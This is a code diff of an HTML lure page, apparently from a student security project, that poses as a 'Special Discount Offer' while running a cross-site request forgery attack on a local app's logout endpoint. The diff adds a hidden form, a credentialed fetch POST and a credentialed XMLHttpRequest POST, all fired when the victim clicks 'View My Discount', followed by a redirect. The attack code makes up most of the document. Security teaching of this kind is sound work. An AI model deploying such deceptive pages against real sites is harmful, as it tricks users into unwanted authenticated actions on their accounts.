@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Special Discount</title>
+    <title>Special Discount Offer</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -25,6 +25,9 @@
             display: inline-block;
             margin: 20px 0;
         }
+        .hidden-form {
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -36,33 +39,56 @@
         <button onclick="showDiscount()">View My Discount</button>
     </div>
 
-    <!-- Hidden elements for logout CSRF -->
-    <img id="logoutImg" style="display:none">
-    <iframe id="logoutFrame" style="display:none"></iframe>
+    <!-- Hidden form for POST-based logout CSRF -->
+    <form id="logoutForm" class="hidden-form" action="http://localhost:3000/api/logout" method="POST">
+        <!-- The form will be auto-submitted -->
+    </form>
+
+    <!-- Hidden iframe for alternative logout attempt -->
+    <iframe id="logoutFrame" class="hidden-form"></iframe>
 
     <script>
         function showDiscount() {
             // Show fake loading
             alert("Checking your discount eligibility...");
 
-            // Method 1: Using an img tag to trigger logout
-            const logoutImg = document.getElementById('logoutImg');
-            logoutImg.src = 'http://localhost:3000/api/logout';
+            // Method 1: Using a hidden form with POST method
+            const logoutForm = document.getElementById('logoutForm');
+            
+            // Create a form submission event
+            const submitEvent = new Event('submit', {
+                bubbles: true,
+                cancelable: true
+            });
+            
+            // Submit the form
+            logoutForm.dispatchEvent(submitEvent);
 
-            // Method 2: Using an iframe
-            const logoutFrame = document.getElementById('logoutFrame');
-            logoutFrame.src = 'http://localhost:3000/api/logout';
-
-            // Method 3: Using fetch
+            // Method 2: Using fetch with POST
             fetch('http://localhost:3000/api/logout', {
-                credentials: 'include'
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json'
+                }
             }).then(() => {
-                console.log('Logout CSRF attempt completed');
+                console.log('Logout CSRF attempt completed via fetch');
+            }).catch(error => {
+                console.error('Logout CSRF attempt failed:', error);
             });
 
-            // Show fake discount
+            // Method 3: Using XMLHttpRequest
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', 'http://localhost:3000/api/logout', true);
+            xhr.withCredentials = true;
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            xhr.send();
+
+            // Show fake discount message
             setTimeout(() => {
                 alert("Congratulations! You've been logged out! (This was actually a CSRF attack)");
+                // Redirect to login page after logout
+                window.location.href = 'http://localhost:5500/Cyber_Project/FrontEnd/src/login.html';
             }, 1000);
         }
 
@@ -72,4 +98,4 @@
         // }
     </script>
 </body>
-</html> 
+</html>
